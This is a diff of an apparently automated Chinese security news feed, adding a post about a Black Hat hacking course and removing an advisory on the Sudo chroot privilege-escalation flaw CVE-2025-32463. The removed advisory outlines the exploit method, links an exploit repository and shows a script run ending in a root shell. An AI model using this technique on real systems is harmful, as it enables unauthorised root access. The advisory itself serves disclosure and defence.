@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2025-07-02T14:45:19.084Z</updated>
+  <updated>2025-07-02T15:00:27.276Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,31 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>BlackHatEvents twitter update</title>
+    <link href="http://example.com/2025/07/02/twitter_3674883056/"/>
+    <id>http://example.com/2025/07/02/twitter_3674883056/</id>
+    <published>2025-07-02T15:00:27.275Z</published>
+    <updated>2025-07-02T15:00:27.276Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>博主：</strong> BlackHatEvents</p><p><strong>推文：</strong> #BHUSA培训“基础网络黑客技术”让参与者熟悉网络应用程序及网络安全问题的基本知识。在这为期两天的课程中，将讨论多种工具和技术，辅以系统化的黑客攻击各阶段方法。立即注册&gt;&gt; <a href="https://t.co/MQQK5CrU6S">https://t.co/MQQK5CrU6S</a></p><p><strong>链接：</strong> <a href="https://x.com/BlackHatEvents/status/1940411430366265425">https://x.com/BlackHatEvents/status/1940411430366265425</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;strong&gt;博主：&lt;/strong&gt; BlackHatEvents&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;推文：&lt;/strong&gt; #BHUSA培训“基础网络黑客技术”让参与者熟悉网络应用程序及网络安全问题的基本知识。在这为期两天的课程中，将讨论多种工具和技术，辅以系统化的黑客</summary>
+      
+    
+    
+    
+    <category term="推特监控" scheme="http://example.com/categories/%E6%8E%A8%E7%89%B9%E7%9B%91%E6%8E%A7/"/>
+    
+    
+    <category term="BlackHatEvents" scheme="http://example.com/tags/BlackHatEvents/"/>
+    
+  </entry>
   
   <entry>
     <title>WordPress OpalEstate Plugin 未授权权限提升漏洞</title>
@@ -517,33 +542,6 @@
     <category term="CVE-2025:github search" scheme="http://example.com/tags/CVE-2025-github-search/"/>
     
     <category term="其他" scheme="http://example.com/tags/%E5%85%B6%E4%BB%96/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Sudo chroot 漏洞</title>
-    <link href="http://example.com/2025/07/02/github_2402304019/"/>
-    <id>http://example.com/2025/07/02/github_2402304019/</id>
-    <published>2025-07-02T09:15:16.432Z</published>
-    <updated>2025-07-02T09:15:16.428Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Sudo chroot 漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-32463</li></ul><p><strong>漏洞类型：</strong> 权限提升</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> CVE-2025-32463是Sudo中的一个权限提升漏洞，影响版本从1.9.14到1.9.17。攻击者可以利用此漏洞通过特定的chroot环境设置和恶意的nsswitch.conf文件，编译并执行恶意的共享库，从而获得root权限。</p><p><strong>产品名称：</strong> Sudo</p><p><strong>影响版本：</strong> 1.9.14 to 1.9.17</p><p><strong>来源：</strong> <a href="https://github.com/neko205-mx/CVE-2025-32463_Exploit">https://github.com/neko205-mx/CVE-2025-32463_Exploit</a></p><p><strong>类型：</strong> CVE-2025:github search</p><h1 id="仓库文件"><a href="#仓库文件" class="headerlink" title="仓库文件"></a>仓库文件</h1><ul><li>README.md</li><li>run.sh</li></ul><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h2 id="CVE-2025-32463-Exploit"><a href="#CVE-2025-32463-Exploit" class="headerlink" title="CVE-2025-32463_Exploit"></a>CVE-2025-32463_Exploit</h2><p>受危害版本 1.9.14 to 1.9.17</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">bash run.sh<br></code></pre></td></tr></table></figure><p>成功如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs shell">neko@aosc-neko205 [ CVE-2025-32463_Exploit@main ] $ bash run.sh <br>[+] CVE-2025-32463 Sudo chroot 漏洞复现脚本<br>[*] 正在创建临时工作目录...<br>[*] 工作目录已创建: /tmp/sudo_exploit.nc0EjT<br>[*] 正在创建 C 语言 payload (woot1337.c)...<br>[*] 正在设置 chroot 环境和恶意的 nsswitch.conf...<br>[*] 正在将 payload 编译为共享库 (libnss_/woot1337.so.2)...<br>[*] 编译成功！<br>[+] root shell!!!!!<br>woot!<br>root@aosc-neko205 [ / ] # id<br>uid=0(root) gid=0(root) 组=0(root),11(audio),12(video),15(cdrom),974(ollama),997(wheel),999(plugdev),1001(neko),1002(gamemode)<br>root@aosc-neko205 [ / ] # exit<br></code></pre></td></tr></table></figure>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Sudo chroot 漏洞&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;漏洞编号：&lt;/st</summary>
-      
-    
-    
-    
-    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
-    
-    
-    <category term="CVE-2025:github search" scheme="http://example.com/tags/CVE-2025-github-search/"/>
-    
-    <category term="权限提升" scheme="http://example.com/tags/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"/>
     
   </entry>
   
